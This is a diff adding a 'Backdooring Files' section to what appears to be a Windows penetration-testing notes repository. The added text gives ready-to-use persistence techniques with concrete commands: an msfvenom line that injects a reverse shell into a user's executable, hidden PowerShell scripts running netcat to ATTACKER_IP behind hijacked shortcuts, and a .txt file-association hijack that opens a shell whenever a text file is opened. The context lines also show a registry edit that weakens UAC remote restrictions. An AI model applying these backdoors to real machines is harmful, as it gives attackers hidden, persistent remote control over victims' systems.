@@ -83,3 +83,61 @@ Due to UAC (User Account Control) admin rights may be stripped upon remote conne
 `C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`
 
 Where `/t` is the datatype, `/v` is the valuename, and `/d` is the data.
+
+## Backdooring Files
+
+### Executables
+Find an executable that the user is likely to use frequently (check desktop). Once you find the executable download it to the attacking machine.
+
+We can then use [msfvenom](../../useful_tools/Linux/README.md#msfvenom) to implant a reverse shell thread into the executable.
+
+`msfvenom -a x64 --platform windows -x <executable name> -k -p windows/x64/shell_reverse_tcp lhost=<Attacker IP> lport=4444 -b "\x00" -f exe -o puttyX.exe`
+
+You can then put it back on the system in the same place. That way a reverse shell will occur each time the user runs the program.
+
+### Shortcut Files
+Find a frequently used application and right-click to select properties. Here we can see the target value is the location of the application.
+
+We can create a simple powershell script and hide it in `C:\Windows\System32`. The script could use [netcat](../../useful_tools/Windows/README.md#netcat):
+
+```
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+
+C:\Windows\System32\calc.exe
+```
+
+Use the application's location as the last line. `nc64.exe` can be placed anywhere, but then update the location in the script.
+
+Afterwards we can update the shortcut's Target to our backdoor script.
+
+`powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1`
+
+This will open our backdoor in the background using powershell. You may need to change the icon back (search using the original location and you should find the original icon)
+
+### Hijacking File Associations
+We can have the OS run a shell for us whenever a certain file type is executed!
+
+We need to find the ProgID of the file type first. This can be found in the registry `HKLM\Software\Classes\`. For example looking at .txt files.
+
+![ProgID](../../images/ProgID.png)
+
+Once we find the ProgID we then need to search for the subkey (also under `HKLM\Software\Classes\`). Once found go to `shell\open\command` subkey
+
+![File Association](../../images/file_association.png)
+
+Here we will see the default program to open the file. At the end you will notice `%1`, which is the first argument or the file that is trying to open.
+
+We can then create a new backdoor program that will take advantage of this.
+
+```
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+```
+
+Notice that we need to pass the file name ourselves using `$args[0]` in our powershell script. Again we will need [netcat](../../useful_tools/Windows/README.md#netcat).
+
+We then need to update the Data section to point to our backdoor program.
+
+`powershell -windowstyle hidden C:\windows\system32\backdoor.ps1 %1`
+
+Anytime someone opens a `.txt` file we will get a shell!
